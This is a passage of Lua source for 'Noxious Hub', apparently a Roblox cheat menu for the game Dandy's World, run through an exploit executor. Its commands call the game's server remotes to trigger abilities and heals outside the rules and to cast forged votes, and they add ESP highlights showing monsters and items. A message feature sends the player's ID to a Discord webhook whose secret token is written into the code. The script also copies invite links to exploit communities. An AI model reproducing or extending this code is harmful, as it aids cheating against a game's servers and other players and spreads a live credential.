						type="rich",
						color=tonumber"0xFFFFFF",
						thumbnail={
							url="https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
						},
					}
				}
			}
			return noxious["http service"]:JSONEncode(data)
		end

		local function sendWebhook(webhookUrl, data)
			local headers = {
				["content-type"] = "application/json"
			}

			local request = http_request or request or HttpPost or syn.request
			local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
			request(abcdef)
		end

		local webhookUrl = "https://discord.com/api/webhooks/1362795675313508442/c_tfiX9TmMRCaWbN9pEBhivPtgLrx1qcE9VNpHTmNuKbCxU6goAFCswGTawQNK5MVdh4"
		local webhookData = createWebhookData()

		sendWebhook(webhookUrl, webhookData)
		noxious["click sound"]:Play()
	end
	)

	local function centermessage()
		local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
		local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

		local frameWidth = 594			
		local frameHeight = 330			
		local centerX = (screenWidth - frameWidth) / 2
		local centerY = (screenHeight - frameHeight) / 2 - 58

		messageframe.Position = UDim2.new(0, centerX, 0, centerY)
	end
	centermessage()

	local function dragmessage()
		local frame = messageframe
		local dragToggle 			
		local dragSpeed = 0.25
		local dragStart 			
		local startPos 

		local function updatemainframeinput(input)
			local delta = input.Position - dragStart
			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
				startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			game:GetService'TweenService':Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
		end

		frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
				dragToggle = true
				dragStart = input.Position
				startPos = frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)

		noxious["user input service"].InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if dragToggle then
					updatemainframeinput(input)
				end
			end
		end)
	end
	dragmessage()

	local topframe = Instance.new"Frame"		
	topframe.Size = UDim2.new(0.9999000000000001, 0, 0, 52.800000000000004)
	topframe.BackgroundColor3 = noxious["default black color"]
	topframe.BorderColor3 = noxious["default white color"]
	topframe.BorderSizePixel = 1
	topframe.Parent = messageframe

	local closemessage = Instance.new"TextButton"		
	closemessage.Size = UDim2.new(0, 36.300000000000004, 0, 36.300000000000004)
	closemessage.BackgroundColor3 = noxious["default black color"]
	closemessage.Position = UDim2.new(0.9256, 0, 0.157, 0)
	closemessage.BorderColor3 = noxious["default white color"]
	closemessage.BorderSizePixel = 1
	closemessage.TextColor3 = noxious["default white color"]
	closemessage.Font = Enum.Font.Nunito
	closemessage.TextSize = 20
	closemessage.TextScaled = false
	closemessage.Text = "X"
	closemessage.TextXAlignment = Enum.TextXAlignment.Center
	closemessage.TextYAlignment = Enum.TextYAlignment.Center
	closemessage.Parent = topframe

	local reposmessage = Instance.new"TextButton"		
	reposmessage.Size = UDim2.new(0, 36.3, 0, 36.3)
	reposmessage.BackgroundColor3 = noxious["default black color"]
	reposmessage.Position = UDim2.new(0.8489, 0, 0.158, 0)
	reposmessage.BorderColor3 = noxious["default white color"]
	reposmessage.BorderSizePixel = 1
	reposmessage.TextColor3 = noxious["default white color"]
	reposmessage.Font = Enum.Font.Nunito
	reposmessage.TextSize = 20
	reposmessage.TextScaled = false
	reposmessage.Text = "R"
	reposmessage.TextXAlignment = Enum.TextXAlignment.Center
	reposmessage.TextYAlignment = Enum.TextYAlignment.Center
	reposmessage.Parent = topframe

	reposmessage.MouseButton1Click:Connect(
		function()
			centermessage()
			noxious["click sound"]:Play()
		end
	)

	closemessage.MouseButton1Click:Connect(
		function()
			messageframe:Destroy()
			noxious["click sound"]:Play()
			mainframe.Visible = true
			noxious["toggle interface visibility button"].Visible = true
		end
	)

	local messagetopframetxt = Instance.new"TextLabel"		
	messagetopframetxt.Size = UDim2.new(0.55, 0, 1.1, 0)
	messagetopframetxt.Position = UDim2.new(0.019, 8, 0, -2)
	messagetopframetxt.BackgroundTransparency = 1
	messagetopframetxt.TextColor3 = noxious["default white color"]
	messagetopframetxt.Font = Enum.Font.Nunito
	messagetopframetxt.TextSize = 21.6
	messagetopframetxt.TextScaled = false
	messagetopframetxt.Text = "Message / Noxious Hub: Dandy's World"
	messagetopframetxt.TextXAlignment = Enum.TextXAlignment.Left
	messagetopframetxt.Parent = topframe

	if mainframe.Visible == true then
		messageframe:Destroy()
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

lineThickness = 6
lineLength = 40
gapSize = 17
fadeOutTime = 0.3
activeCrosshairs = {}
crosshairsEnabled = false

function createCrosshair(position)
	if not crosshairsEnabled then
		return
	end

	local crosshairFrame = Instance.new"Frame"		
	crosshairFrame.Size = UDim2.new(0, lineLength * 2 + gapSize, 0, lineLength * 2 + gapSize)
	crosshairFrame.Position = UDim2.new(0, position.X, 0, position.Y)
	crosshairFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	crosshairFrame.BackgroundTransparency = 1
	crosshairFrame.Parent = noxious["noxious screen gui"]
	crosshairFrame.ZIndex = math.huge

	local function createLine(size, pos)
		local line = Instance.new"Frame"			
		line.Size = size
		line.Position = pos
		line.BackgroundColor3 = Color3.new(1, 1, 1)
		line.BorderSizePixel = 0
		line.AnchorPoint = Vector2.new(0.5, 0.5)
		line.Parent = crosshairFrame
		line.ZIndex = 999
		return line
	end

	createLine(UDim2.new(0, lineThickness, 0, lineLength), UDim2.new(0.5, 0, 0, -gapSize / 2))
	createLine(UDim2.new(0, lineThickness, 0, lineLength), UDim2.new(0.5, 0, 1, gapSize / 2))
	createLine(UDim2.new(0, lineLength, 0, lineThickness), UDim2.new(0, -gapSize / 2, 0.5, 0))
	createLine(UDim2.new(0, lineLength, 0, lineThickness), UDim2.new(1, gapSize / 2, 0.5, 0))

	local function spinCrosshair()
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
		local tween = noxious["tween service"]:Create(crosshairFrame, tweenInfo, {Rotation = 360})
		tween:Play()
	end

	spinCrosshair()

	return crosshairFrame
end

function updateCrosshair(crosshairFrame, position)
	crosshairFrame.Position = UDim2.new(0, position.X, 0, position.Y)
end

function fadeOutCrosshair(crosshairFrame)
	local tweenInfo = TweenInfo.new(fadeOutTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)


	for _, line in pairs(crosshairFrame:GetChildren()) do
		local tween = noxious["tween service"]:Create(line, tweenInfo, {BackgroundTransparency = 1})
		tween:Play()
	end

	task.delay(
		fadeOutTime,
		function()
			crosshairFrame:Destroy()
		end
	)
end

noxious["user input service"].InputBegan:Connect(
	function(input, processed)
		if
			(input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) and
			crosshairsEnabled
		then
			local position = input.Position
			local crosshair = createCrosshair(position)
			if crosshair then
				activeCrosshairs[input] = crosshair

				input:GetPropertyChangedSignal"Position":Connect(
					function()
						if activeCrosshairs[input] then
							updateCrosshair(crosshair, input.Position)
						end
					end
				)

				input:GetPropertyChangedSignal"UserInputState":Connect(
					function()
						if input.UserInputState == Enum.UserInputState.End then
							fadeOutCrosshair(crosshair)
							activeCrosshairs[input] = nil
						end
					end
				)
			end
		end
	end
)

addcommand("enablemobiletapindicators", "emti", function()
	crosshairsEnabled = true
end)

addcommand("disablemobiletapindicators", "dmti", function()
	crosshairsEnabled = false
	for _, crosshair in pairs(activeCrosshairs) do
		fadeOutCrosshair(crosshair)
	end
	activeCrosshairs = {}
end)

-------------------------------------------------------------------------------------------------------------------------------

function stoprunningconnections()
	spawn(function() execcmd("unview") end)
	spawn(function() execcmd("daf") end)
	spawn(function() execcmd("untpwalk") end)
	spawn(function() execcmd("drosrpn") end)
	spawn(function() execcmd("dgrpn") end)
	spawn(function() execcmd("dtcg") end)
	spawn(function() execcmd("dricg") end)
	spawn(function() execcmd("dtn") end)
	spawn(function() execcmd("drin") end)
	spawn(function() execcmd("dhn") end)
	spawn(function() execcmd("ddpn") end)
	spawn(function() execcmd("dinmd") end)
	spawn(function() execcmd("hdg") end)
	spawn(function() execcmd("dgfb") end)
	spawn(function() execcmd("dlhcg") end)
	spawn(function() execcmd("ddpcg") end)
	spawn(function() execcmd("unspin") end)
	spawn(function() execcmd("datpt7pe") end)
	spawn(function() execcmd("rec") end)
	spawn(function() execcmd("dia") end)
	spawn(function() execcmd("hot") end)
	spawn(function() execcmd("dasb") end)
	spawn(function() execcmd("dlrs") end)
	spawn(function() execcmd("daui") end)
	spawn(function() execcmd("unfly") end)
	spawn(function() execcmd("uncffly") end)
	spawn(function() execcmd("daua") end)
	spawn(function() execcmd("djump") end)
	spawn(function() execcmd("dgnt") end)
	spawn(function() execcmd("clip") end)
	spawn(function() execcmd("dac") end)
	spawn(function() execcmd("hap") end)
	spawn(function() execcmd("datpte") end)
	spawn(function() execcmd("sespt") end)
	spawn(function() execcmd("sesph") end)
	spawn(function() execcmd("daesp") end)
	spawn(function() execcmd("dfb") end)
	spawn(function() execcmd("dafb") end)
	spawn(function() execcmd("unhead") end)
	spawn(function() execcmd("unhsit") end)
	spawn(function() execcmd("unhsit2") end)
	spawn(function() execcmd("unhjsit") end)
	spawn(function() execcmd("unbbang") end)
	spawn(function() execcmd("dwf") end)
	spawn(function() hideRadius("KillRadius") end)
	spawn(function() hideRadius("InstantRadius") end)
	spawn(function() hideRadius("VisionRadius") end)
	spawn(function() hideRadius("HearingRadius") end)
	spawn(function() execcmd("unbang") end)
	spawn(function() disableAnimation() end)
	spawn(function() execcmd("undance") end)
	spawn(function() execcmd("sdl") end)
	spawn(function() execcmd("hph") end)
	spawn(function() execcmd("untpose") end)
	spawn(function() execcmd("ctkb") end)
	spawn(function() execcmd("unbodiless") end)
	spawn(function() execcmd("unheadless") end)
	spawn(function() execcmd("unarmless") end)
	spawn(function() execcmd("unlegless") end)
	spawn(function() execcmd("unkorblox") end)
	spawn(function() execcmd("dlfui all") end)
	spawn(function() disableAllAnimationLoops() end)
	spawn(function() execcmd("dga") end)
end

addcommand("stoprunningconnections", "src", function()
	stoprunningconnections()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("console", "console", function()
	local tcs = game:GetService("TextChatService")
	if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
		tcs.TextChannels.RBXGeneral:SendAsync("/console")
	else
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/console", "All")
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("hidedeveloperlabel", "hdl", function()
	for _, player in ipairs(noxious["players"]:GetPlayers()) do
		local character = player.Character
		if character then
			local HRP = character:FindFirstChild"HumanoidRootPart"				
			if HRP then
				local billboardGui = HRP:FindFirstChild"UserImageBillboard"					
				if billboardGui then
					billboardGui.Size = UDim2.new(0, 0, 0, 0)
				end
			end
		end
	end
end)

addcommand("showdeveloperlabel", "sdl", function()
	for _, player in ipairs(noxious["players"]:GetPlayers()) do
		local character = player.Character
		if character then
			local HRP = character:FindFirstChild"HumanoidRootPart"				
			if HRP then
				local billboardGui = HRP:FindFirstChild"UserImageBillboard"					
				if billboardGui then
					billboardGui.Size = UDim2.new(0, 0, 0, 0)
				end
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("executeallfavoritedcommands", "eafc", function()
	if #noxious["command lists"]["Favorited Commands"] == 0 then
		notify("No pinned commands to execute.", 5, "error")
		return
	end

	for _, pinnedCommand in ipairs(noxious["command lists"]["Favorited Commands"]) do
		task.spawn(function()
			local mainCommand = pinnedCommand:match("^(.-),") or pinnedCommand:match("^(.-)%s*%-") or pinnedCommand

			execcmd(mainCommand)
		end)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("dandybindiscord", "dbdiscord", function()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Copied to clipboard.", 5)
		else
			notify("Unable to access clipboard.", 5, "error")
		end
	end
	toClipboard"https://discord.com/invite/dandysworldexploits"	
end)

addcommand("hexdiscord", "hdiscord", function()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Copied to clipboard.", 5)
		else
			notify("Unable to access clipboard.", 5, "error")
		end
	end
	toClipboard"https://discord.gg/QnkQ9q4P"	
end)

addcommand("blushcrunchdiscord", "bcdiscord", function()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Copied to clipboard.", 5)
		else
			notify("Unable to access clipboard.", 5, "error")
		end
	end
	toClipboard"https://discord.gg/blushcrunch"	
end)

addcommand("noxiousdiscord", "nxsdiscord", function()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Copied to clipboard.", 5)
		else
			notify("Unable to access clipboard.", 5, "error")
		end
	end
	toClipboard"https://discord.gg/p63HPpj5G4"	
end)

addcommand("gobbydiscord", "gbydiscord", function()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Copied to clipboard.", 5)
		else
			notify("Unable to access clipboard.", 5, "error")
		end
	end
	toClipboard"https://discord.gg/acwaBYnSJM"	
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("notifyversion", "notifyver", function()
	notify("The current version is: " .. noxious["version"], 5)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("closeallnotifications", "can", function()
	closeallnotifs()
end)

-------------------------------------------------------------------------------------------------------------------------------

local toggleKey
local keybindReady = false

addcommand("settogglekeybind", "stkb", function()
	notify("Press a key.", 5)
	local connection
	connection = game:GetService("UserInputService").InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Keyboard then
			if input.KeyCode == Enum.KeyCode.Return then
			else
				toggleKey = input.KeyCode
				keybindReady = false
				notify("Toggle interface keybind: " .. tostring(toggleKey):gsub("Enum.KeyCode.", ""), 5)
				connection:Disconnect()

				task.delay(1, function()
					keybindReady = true
				end)
			end
		end
	end)
end)

addcommand("cleartogglekeybind", "ckb", function()
	toggleKey = nil
	keybindReady = false
	notify("Toggle keybind has been cleared.", 5)
end)


game:GetService("UserInputService").InputBegan:Connect(function(input)
	if keybindReady and toggleKey and input.KeyCode == toggleKey then
		togglevisibility()
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("joinlobby", "jl", function()
	local TeleportService = game:GetService"TeleportService"

	TeleportService:Teleport(noxious["dandy's world lobby"], noxious["local player"])
end)

addcommand("joinroleplayserver", "jrps", function()
	local TeleportService = game:GetService"TeleportService"

	TeleportService:Teleport(noxious["dandy's world roleplay server"], noxious["local player"])
end)

addcommand("joinrun", "jr", function()
	local TeleportService = game:GetService"TeleportService"

	TeleportService:Teleport(noxious["dandy's world run"], noxious["local player"])
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("sproutselfheal", "ssh", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Sprout") and (not characterName or characterName ~= "Sprout") then
		notify("You need to be Sprout to enable this.", 5, "error")
		return
	end

	local args = {
		[1] = player.Character,
		[2] = CFrame.new(-179.29843139648438, 146.2311248779297, -164.61495971679688) * CFrame.Angles(3.1415927410125732, 0.4017193913459778, -3.141592502593994),
		[3] = player.Character
	}

	game:GetService"ReplicatedStorage".Events.AbilityEvent:InvokeServer(unpack(args))
end)

addcommand("cosmoselfheal", "csh", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"
	-- Check for ToonName

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"
	-- Fallback to Config.CharacterName if ToonName is not found

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	-- Notify error if neither ToonName nor CharacterName matches "Goob"
	if (not toonName or toonName.Value ~= "Cosmo") and (not characterName or characterName ~= "Cosmo") then
		notify("You need to be Cosmo to enable this.", 5, "error") -- Display notification
		return
	end

	-- Proceed with the main functionality
	local args = {
		[1] = player.Character,
		[2] = CFrame.new(-85.81144714355469, 146.0568084716797, 4.6407670974731445) * CFrame.Angles(1.1656561582640279e-07, -0.4113893210887909, -2.73472409162423e-08),
		[3] = player.Character
	}

	game:GetService("ReplicatedStorage").Events.AbilityEvent:InvokeServer(unpack(args))
end)

-------------------------------------------------------------------------------------------------------------------------------

local autoshellyboostenabled = false

function checktoon()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Shelly") and (not characterName or characterName ~= "Shelly") then
		notify("You need to be Shelly to enable this.", 5, "error")
		return false
	end

	return true
end

function runautoshellyboost()
	local player = game.Players.LocalPlayer
	local playerModel = workspace:FindFirstChild"InGamePlayers":FindFirstChild(player.Name)

	if playerModel then
		local currentRoom = workspace:FindFirstChild"CurrentRoom"

		if currentRoom then
			while autoshellyboostenabled do
				for _, model in ipairs(currentRoom:GetChildren()) do
					local generatorsFolder = model:FindFirstChild"Generators"

					if generatorsFolder then
						for _, generator in ipairs(generatorsFolder:GetChildren()) do
							local statsFolder = generator:FindFirstChild"Stats"

							if statsFolder then
								local activePlayer = statsFolder:FindFirstChild"ActivePlayer"

								if activePlayer and activePlayer.Value == playerModel then
									local args = {
										[1] = player.Character,
										[2] = CFrame.new(-179.29843139648438, 146.2311248779297, -164.61495971679688) * CFrame.Angles(3.1415927410125732, 0.4017193913459778, -3.141592502593994),
										[3] = player.Character
									}

									game:GetService"ReplicatedStorage".Events.AbilityEvent:InvokeServer(unpack(args))
								end
							end
						end
					end
				end
				wait(0)
			end
		end
	end
end

addcommand("enableautoshellyboost", "easb", function()
	if not autoshellyboostenabled and checktoon() then
		autoshellyboostenabled = true
		runautoshellyboost()
	end
end)

addcommand("disableautoshellyboost", "dasb", function()
	autoshellyboostenabled = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enablefloatdistract1", "efd1", function()
	if game.PlaceId ~= noxious["dandy's world run"] then notify("You can only run this command in a run.", 5, "warning") return end
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.HipHeight = 4.8
	end
end)

addcommand("enablefloatdistract2", "efd2", function()
	if game.PlaceId ~= noxious["dandy's world run"] then notify("You can only run this command in a run.", 5, "warning") return end
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.HipHeight = 5.6
	end
end)

addcommand("enablefloatdistract3", "efd3", function()
	if game.PlaceId ~= noxious["dandy's world run"] then notify("You can only run this command in a run.", 5, "warning") return end
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.HipHeight = 6.7
	end
end)

addcommand("disablefloatdistract", "dfd", function()
	if game.PlaceId ~= noxious["dandy's world run"] then notify("You can only run this command in a run.", 5, "warning") return end
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.HipHeight = 2
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function capname(name)
	if not name or #name == 0 then return name end
	return name:sub(1, 1):upper() .. name:sub(2):lower()
end

addcommand("faketooncard", "ftc", function(args)
	local name = args
	local capitalizedName = capname(name)

	-- Check if the capitalizedName is "razzledazzle" or "razzle and dazzle"
	if capitalizedName:lower() == "razzledazzle" or capitalizedName:lower() == "razzleanddazzle" or capitalizedName:lower() == "rnd" then
		capitalizedName = "RazzleDazzle"
	end

	if capitalizedName:lower() == "pebble" or capitalizedName:lower() == "pebbles" then
		capitalizedName = "Pebble"
	end

	local customArgs = {
		[1] = capitalizedName
	}

	game:GetService"ReplicatedStorage":WaitForChild"Events":WaitForChild"Voted":InvokeServer(unpack(customArgs))
end)

-------------------------------------------------------------------------------------------------------------------------------

local highlightTypes = {
	Monsters = false,
	FakeElevator = false,
	Items = false,
	Players = false,
	Machines = false
}

local billboardTextVisible = true
local highlightVisible = true


local highlightLoopRunning = false

function createBillboardGui(parent, modelName, textColor, generatorStats)
	local billboard = Instance.new"BillboardGui"		
	billboard.Name = "EspBillboardGUIName"
	billboard.Adornee = parent
	billboard.Size = UDim2.new(0, 100, 0, 50)
	billboard.AlwaysOnTop = true
	billboard.Parent = parent

	local label = Instance.new"TextLabel"		
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = modelName
	label.Font = Enum.Font.Nunito
	label.TextColor3 = textColor
	label.TextStrokeTransparency = 0.5
	label.TextStrokeColor3 = Color3.new(1, 1, 1)
	label.TextSize = 21.6
	label.Visible = billboardTextVisible
	label.Parent = billboard
	if generatorStats then
		local currentAmount = generatorStats.CurrentAmount or 0
		local requiredAmount = generatorStats.RequiredAmount or 0
		local generatorText = modelName .. "\n(" .. currentAmount .. " / " .. requiredAmount .. ")"

		label.Text = generatorText
	end
end

function toggleBillboardTextVisibility(visible)
	billboardTextVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA"BillboardGui"and descendant.Name == "EspBillboardGUIName" then
			local label = descendant:FindFirstChildOfClass"TextLabel"				
			if label then
				label.Visible = visible
			end
		end
	end
end

function toggleHighlightVisibility(visible)
	highlightVisible = visible

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA"Highlight"then
			descendant.Enabled = visible
		end
	end
end

local TweenService = game:GetService"TweenService"

function tweenMonsterColors(monster)
	local highlight = monster:FindFirstChildOfClass"Highlight"		
	local billboard = monster:FindFirstChild"EspBillboardGUIName"		
	local textLabel = billboard and billboard:FindFirstChildOfClass"TextLabel"

	if highlight then
		local tweenInfo = TweenInfo.new(
			1,
			Enum.EasingStyle.Linear,
			Enum.EasingDirection.InOut,
			-1,
			true
		)

		local highlightTween = TweenService:Create(
			highlight,
			tweenInfo,
			{ FillColor = Color3.new(0, 0, 0) }
		)

		if textLabel then
			local textTween = TweenService:Create(
				textLabel,
				tweenInfo,
				{ TextColor3 = Color3.new(0, 0, 0) }
			)
			textTween:Play()
		end

		highlightTween:Play()
	end
end

function tweenfakeelevatorcolors(fakeele)
	local highlight = fakeele:FindFirstChildOfClass"Highlight"		
	local billboard = fakeele:FindFirstChild"EspBillboardGUIName"		
	local textLabel = billboard and billboard:FindFirstChildOfClass"TextLabel"

	if highlight then
		local tweenInfo = TweenInfo.new(
			1,
			Enum.EasingStyle.Linear,
			Enum.EasingDirection.InOut,
			-1,
			true
		)

		local highlightTween = TweenService:Create(
			highlight,
			tweenInfo,
			{ FillColor = Color3.new(0, 0, 0) }
		)

		if textLabel then
			local textTween = TweenService:Create(
				textLabel,
				tweenInfo,
				{ TextColor3 = Color3.new(0, 0, 0) }
			)
			textTween:Play()
		end

		highlightTween:Play()
	end
end

function tweenEventMonsterColors(monster)
	local highlight = monster:FindFirstChildOfClass("Highlight")		
	local billboard = monster:FindFirstChild("EspBillboardGUIName")		
	local textLabel = billboard and billboard:FindFirstChildOfClass("TextLabel")

	if highlight then
		-- Start from green
		highlight.FillColor = Color3.fromRGB(140, 255, 140)

		local tweenInfo = TweenInfo.new(
			1,
			Enum.EasingStyle.Linear,
			Enum.EasingDirection.InOut,
			-1,
			true
		)

		local highlightTween = TweenService:Create(
			highlight,
			tweenInfo,
			{ FillColor = Color3.fromRGB(237, 121, 210) } -- tween to pink
		)
		highlightTween:Play()

		if textLabel then
			textLabel.TextColor3 = Color3.fromRGB(140, 255, 140) -- start from green

			local textTween = TweenService:Create(
				textLabel,
				tweenInfo,
				{ TextColor3 = Color3.fromRGB(237, 121, 210) } -- tween to pink
			)
			textTween:Play()
		end
	end
end

function tweenItemColors(item)
	-- Safely get the highlight and billboard components
	local highlight = item:FindFirstChildOfClass("Highlight")
	local billboard = item:FindFirstChild("EspBillboardGUIName")
	local textLabel = billboard and billboard:FindFirstChildOfClass("TextLabel")

	-- Only proceed if we have a highlight component
	if highlight then
		local tweenInfo = TweenInfo.new(
			1, -- Time duration
			Enum.EasingStyle.Linear, -- Easing style
			Enum.EasingDirection.InOut, -- Easing direction
			-1, -- Repeat count (-1 for infinite)
			true -- Reverses after completing
		)

		-- Target color (pink in RGB)
		local targetColor = Color3.fromRGB(237, 121, 210)

		-- Create and play highlight tween
		local highlightTween = TweenService:Create(
			highlight,
			tweenInfo,
			{ FillColor = targetColor }
		)
		highlightTween:Play()

		-- Create and play text tween if text label exists
		if textLabel then
			local textTween = TweenService:Create(
				textLabel,
				tweenInfo,
				{ TextColor3 = targetColor }
			)
			textTween:Play()
		end
	end
end

function addHighlights()
	local currentRoom = workspace:FindFirstChild("CurrentRoom")

	-- Monster highlighting
	if highlightTypes.Monsters and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local monstersFolder = model:FindFirstChild("Monsters")
			if monstersFolder then
				for _, monster in pairs(monstersFolder:GetChildren()) do
					if monster:IsA("Model") and not monster:FindFirstChildOfClass("Highlight") then
						local highlight = Instance.new("Highlight")
						local displayText = monster.Name
						local monsterName = monster.Name

						-- Name formatting (same as before)
						if monsterName == "RazzleDazzleMonster" then
							if simpleesp == true then 
								monsterName = "T. R&D"
							else
								monsterName = "Twisted Razzle & Dazzle" 
							end
						else
							monsterName = monsterName:gsub("Monster", "")
							monsterName = monsterName:match("^%s*(.-)%s*$")
							if simpleesp == true then 
								monsterName = "T. " .. monsterName 
							else
								monsterName = "Twisted " .. monsterName 
							end
						end

						displayText = monsterName

						-- Safe color assignment
						highlight.FillColor = getHighlightColor("Monster")
						highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
						highlight.Enabled = highlightVisible
						highlight.Parent = monster

						createBillboardGui(monster, displayText, getHighlightColor("Monster"))

						-- Tween logic (same as before)
						if table.find({"AstroMonster", "VeeMonster", "SproutMonster", "PebbleMonster", "ShellyMonster", "DandyMonster"}, monster.Name) then
							tweenMonsterColors(monster)
						elseif table.find({"BassieMonster", "EggsonMonster", "FlyteMonster", "CocoaMonster", "ShellyMonster", "DandyMonster"}, monster.Name) then
							highlight.FillColor = Color3.fromRGB(140, 255, 140)
							tweenEventMonsterColors(monster)
						end
					end
				end
			end
		end
	end

	-- Fake Elevator highlighting
	if highlightTypes.FakeElevator and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local freeArea = model:FindFirstChild("FreeArea")
			if freeArea then
				local fakeElevator = freeArea:FindFirstChild("FakeElevator")
				if fakeElevator and fakeElevator:IsA("Model") and not fakeElevator:FindFirstChildOfClass("Highlight") then
					local highlight = Instance.new("Highlight")
					-- Safe color assignment
					highlight.FillColor = getHighlightColor("FakeElevator")
					highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
					highlight.Enabled = true
					highlight.Parent = fakeElevator

					local displayText = ""
					if simpleesp == true then 
						displayText = "F. Ele" 
					else 
						displayText = "Fake Elevator" 
					end

					createBillboardGui(fakeElevator, displayText, getHighlightColor("FakeElevator"))
					tweenfakeelevatorcolors(fakeElevator)
				end
			end
		end
	end

	-- Item highlighting
	if highlightTypes.Items and currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local itemsFolder = model:FindFirstChild("Items")
			if itemsFolder then
				for _, item in pairs(itemsFolder:GetChildren()) do
					if item:IsA("Model") and not item:FindFirstChildOfClass("Highlight") then
						local highlight = Instance.new("Highlight")
						local displayText = item.Name
						local formattedText = ""

						-- Research Capsule handling (same as before)
						if item.Name == "ResearchCapsule" then
							function fetchMonsterName()
								local prompt = item:FindFirstChild("Prompt")
								if prompt then
									local monsterString = prompt:FindFirstChild("Monster")
									if monsterString and monsterString:IsA("StringValue") then
